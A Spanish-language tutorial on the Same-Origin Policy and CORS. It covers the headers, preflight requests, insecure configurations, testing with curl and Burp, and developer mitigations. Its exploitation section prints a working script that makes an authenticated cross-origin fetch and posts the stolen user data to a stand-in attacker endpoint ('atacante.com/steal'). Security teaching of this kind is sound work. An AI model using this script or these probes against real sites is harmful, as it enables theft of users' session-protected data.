# Contexto: Same-Origin Policy (SOP) y la Necesidad de CORS

Antes de hablar de CORS, es crucial entender la **Same-Origin Policy (SOP)**. La SOP es una medida de seguridad fundamental implementada por los navegadores web. Impide que un documento o script cargado desde un **origen A** pueda leer o interactuar con recursos de un **origen B** diferente. Un "origen" se define por la combinación de **esquema** (e.g., `http`, `httpsa`), **dominio** (e.g., `ejemplo.com`) y **puerto** (e.g., `80`, `443`).

Si bien la SOP es vital para la seguridad, a veces las aplicaciones web legítimas necesitan solicitar recursos de un origen distinto (e.g., una API en un subdominio, fuentes de un CDN). Aquí es donde entra **CORS**.

### ¿Qué es CORS (Cross-Origin Resource Sharing)?

**CORS** es un mecanismo basado en cabeceras HTTP que permite a los servidores web especificar qué orígenes (dominios, esquemas o puertos distintos al suyo) tienen permiso para solicitar y acceder a sus recursos. Esencialmente, CORS permite a los servidores _relajar_ la SOP de forma controlada.

#### Cabeceras HTTP Clave en CORS:

**Cabeceras de Petición (enviadas por el navegador):**

- **`Origin`**:
  - Enviada automáticamente por el navegador en peticiones cross-origin.
  - Indica el origen que inicia la petición (e.g., `Origin: https://solicitante.com`).
  - El servidor la usa para decidir si permite el acceso.

**Cabeceras de Respuesta (enviadas por el servidor):**

- **`Access-Control-Allow-Origin` (ACAO)**:
  - La cabecera más importante. Indica qué orígenes están permitidos.
  - Puede ser:
    - Un origen específico: `Access-Control-Allow-Origin: https://permitido.com`
    - Un comodín `*`: `Access-Control-Allow-Origin: *` (permite cualquier origen, pero tiene implicaciones con las credenciales).
    - `null`: `Access-Control-Allow-Origin: null` (para orígenes opacos como archivos locales `file:///` o iframes sandboxed).
- **`Access-Control-Allow-Credentials` (ACAC)**:
  - Valor booleano (`true` o `false`).
  - Si es `true`, permite que el navegador envíe credenciales (cookies, cabeceras de autorización HTTP) en la petición cross-origin y que el JavaScript del cliente acceda a la respuesta.
  - **Importante:** Si `Access-Control-Allow-Credentials: true` está presente, el valor de `Access-Control-Allow-Origin` **no puede ser `*`**. Debe ser un origen específico. Si el servidor devuelve `*` y `true` para las credenciales, los navegadores modernos generalmente bloquean la respuesta por seguridad.
- **`Access-Control-Allow-Methods`**:
  - Usada en respuestas a peticiones _preflight_.
  - Especifica una lista de métodos HTTP permitidos para el recurso (e.g., `GET, POST, PUT, DELETE`).
- **`Access-Control-Allow-Headers`**:
  - Usada en respuestas a peticiones _preflight_.
  - Especifica una lista de cabeceras HTTP que pueden usarse en la petición real.
- **`Access-Control-Expose-Headers`**:
  - Lista cabeceras de respuesta (además de las "simples") a las que el script del cliente puede acceder.
- **`Access-Control-Max-Age`**:
  - Usada en respuestas a peticiones _preflight_.
  - Indica (en segundos) cuánto tiempo puede el navegador cachear los resultados de la petición preflight, evitando enviar una petición `OPTIONS` cada vez.
- **`Vary: Origin`**:
  - Indica a los navegadores y proxies que la respuesta del servidor puede variar según el valor de la cabecera `Origin` de la petición.
  - Es crucial si el servidor devuelve dinámicamente diferentes valores de `Access-Control-Allow-Origin` para evitar que una caché sirva una respuesta incorrecta a un origen diferente.

### Peticiones "Preflight" (`OPTIONS`)

Para ciertas peticiones cross-origin consideradas "no simples", el navegador envía automáticamente una petición HTTP `OPTIONS` previa a la petición real. Esto se conoce como _petición preflight_.

**Una petición se considera "no simple" si:**

- Usa métodos HTTP distintos a `GET`, `HEAD`, o `POST` (con `Content-Type` simple).
- Si es `POST` y usa un `Content-Type` distinto a `application/x-www-form-urlencoded`, `multipart/form-data`, o `text/plain`.
- Incluye cabeceras HTTP personalizadas (e.g., `X-Custom-Header`).

El servidor responde a la petición `OPTIONS` con las cabeceras `Access-Control-Allow-Methods`, `Access-Control-Allow-Headers`, y `Access-Control-Max-Age`. Si la respuesta preflight es satisfactoria (permite el método, las cabeceras, etc.), el navegador procede a enviar la petición real.

**Implicación en la explotación:** A veces, la lógica de validación CORS puede ser diferente para las peticiones `OPTIONS` y las peticiones reales, o una de ellas podría ser más laxa.

### Configuraciones Inseguras Comunes (Vectores de Ataque)

El objetivo de un atacante es encontrar una configuración CORS que le permita hacer que el navegador de una víctima autenticada envíe una petición a un dominio vulnerable y que el script del atacante pueda leer la respuesta (que podría contener datos sensibles).

1. **`Access-Control-Allow-Origin` Refleja Dinámicamente el `Origin` de la Petición + `Access-Control-Allow-Credentials: true`**:
   - **El más crítico y común.** El servidor toma el valor de la cabecera `Origin` de la petición y lo copia en la cabecera `Access-Control-Allow-Origin` de la respuesta.
   - Si además envía `Access-Control-Allow-Credentials: true`, un atacante puede hacer que el navegador de la víctima envíe peticiones autenticadas al servidor vulnerable y el script del atacante podrá leer la respuesta.

```
// Petición del navegador desde https://atacante.com a https://victima.com/api/datos
 Origin: https://atacante.com

 // Respuesta del servidor https://victima.com
 Access-Control-Allow-Origin: https://atacante.com  // Reflejado!
 Access-Control-Allow-Credentials: true
// ... otros datos sensibles ...
```

2. **`Access-Control-Allow-Origin: *` (Wildcard) con Datos Sensibles (sin credenciales)**:
   - Si un endpoint expone información sensible que no requiere autenticación, y está configurado con `Access-Control-Allow-Origin: *`, cualquier sitio web puede solicitar y leer esos datos.
   - Como se mencionó, si `Access-Control-Allow-Credentials: true` se envía junto con `ACAO: *`, los navegadores no permitirán que el script lea la respuesta si la petición incluyó credenciales.
3. **Validación de Origen Débil o Defectuosa**:
   - **Subdominios mal validados:**
     - El servidor intenta permitir solo sus subdominios pero lo hace incorrectamente.
       - Ej: Permite `https://*.victima.com` pero el atacante registra `https://cualquiercosa.victima.com.atacante.com` y la validación (e.g., `endsWith(".victima.com")`) es engañada.
       - Ej: Permite `https://sub.victima.com` y el atacante encuentra una XSS en `sub.victima.com` para saltar la SOP.
   - **`Access-Control-Allow-Origin: null` + `Access-Control-Allow-Credentials: true`**:
     - El origen `null` se envía para archivos locales (`file:///`), redirecciones, o iframes _sandboxed_. Un atacante podría engañar a la víctima para que abra un archivo HTML malicioso o visite una página con un iframe sandboxed.
   - **Errores en Expresiones Regulares (Regex)**:
     - Si el servidor usa expresiones regulares para validar la cabecera `Origin`, una regex mal construida (e.g., falta de anclajes `^` y `$`, o patrones demasiado permisivos) puede permitir que orígenes maliciosos coincidan.
     - Ejemplo: `https?:\/\/victima\.com\.?` (el `.` final opcional podría permitir `victima.com.atacante.com`).
4. **Confianza Excesiva en Cabeceras HTTP que Pueden Ser Suplantadas (raro en CORS, más en otros contextos)**.

### Ejemplo de Explotación (Robo de Datos)

**Escenario:** Una víctima está autenticada en `https://victima.com`. El endpoint `https://victima.com/api/user-info` devuelve información sensible del usuario y tiene una configuración CORS insegura que refleja el `Origin` y permite credenciales.

**Código malicioso en `https://atacante.com/exploit.html`:**

```html
<script>
  fetch("https://victima.com/api/user-info", {
   method: "GET",
   credentials: "include" // Importante: envía cookies de sesión de la víctima para victima.com
  })
  .then(response => response.text()) // O response.json() si es JSON
  .then(data => {
 // Enviar los datos robados al servidor del atacante
   fetch("https://atacante.com/steal", {
    method: "POST",
      headers: {
        'Content-Type': 'application/json' // o text/plain
      },
      body: JSON.stringify({leakedData: data}) // o solo 'data' si es texto
    });
  })
  .catch(error => console.error('Error en la explotación CORS:', error));
</script>
```

**¿Qué pasa aquí?**

1. La víctima visita `https://atacante.com/exploit.html`.
2. El script en la página del atacante hace una petición `fetch` a `https://victima.com/api/user-info`.
3. Debido a `credentials: "include"`, el navegador de la víctima adjunta automáticamente las cookies de sesión válidas para `victima.com`.
4. El servidor de `victima.com`, debido a su mala configuración CORS (reflejando `Origin: https://atacante.com` en `Access-Control-Allow-Origin` y enviando `Access-Control-Allow-Credentials: true`), permite la petición.
5. El script en `atacante.com` recibe la respuesta con los datos sensibles de la víctima.
6. El script luego envía estos datos robados a un endpoint controlado por el atacante (`https://atacante.com/steal`).

**Requisitos para la Explotación Exitosa:**

1. La víctima debe estar autenticada en `victima.com` (tener una sesión activa).
2. `victima.com/api/user-info` (o el endpoint objetivo) debe devolver `Access-Control-Allow-Credentials: true`.
3. `victima.com/api/user-info` debe devolver un `Access-Control-Allow-Origin` que valide el origen del atacante (e.g., lo refleja, o la validación es defectuosa).

### Técnicas de Descubrimiento y Pruebas

- **Inspección Manual:**
  - Usa las Herramientas de Desarrollador del navegador (pestaña "Network") para observar las cabeceras CORS en las respuestas.
  - Modifica peticiones (e.g., con Burp Suite o ZAP) para enviar una cabecera `Origin` arbitraria (e.g., `Origin: https://tu-dominio-controlado.com`) y analiza las cabeceras `Access-Control-*` en la respuesta.
  - Prueba con `Origin: null`.
  - Prueba variaciones del dominio objetivo (subdominios, dominios parecidos) si se sospecha de validación débil.
- **Uso de `curl`:**

```bash
  # Petición básica con Origin arbitrario
   curl -v -H "Origin: https://evil-hacker.com" https://victima.com/api/datos-sensibles
  # Petición OPTIONS (preflight)
  curl -v -X OPTIONS -H "Origin: https://evil-hacker.com" \
         -H "Access-Control-Request-Method: POST" \
         -H "Access-Control-Request-Headers: X-Custom-Header" \
         https://victima.com/api/recurso-complejo
```

- **Herramientas Automatizadas:**
  - **Burp Suite:** El escáner puede detectar algunas configuraciones CORS inseguras. La extensión "CORS* Empire" puede ser útil.
  - **Scripts personalizados:** Puedes escribir scripts (e.g., en Python con `requests`) para probar múltiples variaciones de `Origin` y analizar las respuestas.

### CORS vs. Restricciones de Cookies de Terceros

Los navegadores modernos están incrementando las restricciones sobre las "cookies de terceros" (third-party cookies), principalmente para combatir el rastreo entre sitios. Es importante entender la diferencia:

- **Cookies de Terceros:** Se refieren a cookies establecidas por un dominio (`tracker.com`) cuando el usuario está visitando otro dominio (`sitio-visitado.com`) y `tracker.com` tiene contenido embebido (e.g., un iframe, una imagen de píxel).
- **CORS y Cookies:** En el ejemplo de explotación CORS, cuando `atacante.com` hace que el navegador de la víctima pida `victima.com/api/user-info`, las cookies enviadas a `victima.com` son cookies de **primera parte** para `victima.com`. La víctima tiene una sesión con `victima.com`. La vulnerabilidad CORS permite que el script en `atacante.com` _lea la respuesta_ a esa petición hecha con cookies de primera parte de `victima.com`.

Por lo tanto, aunque las restricciones de cookies de terceros son importantes, **no mitigan directamente las vulnerabilidades de configuración CORS** que permiten el robo de datos autenticados.

### Notas Prácticas (Pentester / Bug Hunter)

- **Siempre verifica las cabeceras CORS** para cualquier endpoint que devuelva datos sensibles, especialmente aquellos que requieren autenticación.
- Prueba enviar `Origin: https://tu-dominio-atacante.com`.
- Prueba enviar `Origin: https://subdominio-controlado.dominio-victima.com` (si sospechas de validación laxa de subdominios).
- Prueba enviar `Origin: null`.
- Prueba enviar `Origin` con ligeras variaciones del dominio permitido (e.g., con un puerto diferente, `http` en vez de `https`, un subdominio extra al final).
- Si `Access-Control-Allow-Origin` devuelve un origen específico pero _no_ el tuyo, comprueba si ese origen permitido tiene alguna vulnerabilidad (e.g., XSS) que puedas usar para pivotar.
- No te fíes solo de `Access-Control-Allow-Origin: *`. Investiga si `Access-Control-Allow-Credentials: true` también está presente y cómo reacciona el navegador.
- Busca endpoints que parezcan "internos" o de "desarrollo" que puedan tener configuraciones CORS más laxas por error.

### Mitigaciones (Para Desarrolladores)

- **Configurar `Access-Control-Allow-Origin` con una lista blanca estricta** de orígenes permitidos.
- **Evitar reflejar el valor de la cabecera `Origin`** de la petición en `Access-Control-Allow-Origin`.
- Si se debe usar un comodín (`*`), asegurarse de que el recurso **no exponga datos sensibles y no se combine con `Access-Control-Allow-Credentials: true`**.
- **Validar los orígenes de forma robusta y exacta.** Evitar expresiones regulares complejas o propensas a errores. Usar comparaciones de strings completas si es posible.
- Usar la cabecera **`Vary: Origin`** si se sirven diferentes valores de `Access-Control-Allow-Origin` dinámicamente para diferentes orígenes, para evitar problemas de caché.
- No permitir el origen `null` si no es estrictamente necesario para una funcionalidad específica y bien entendida.
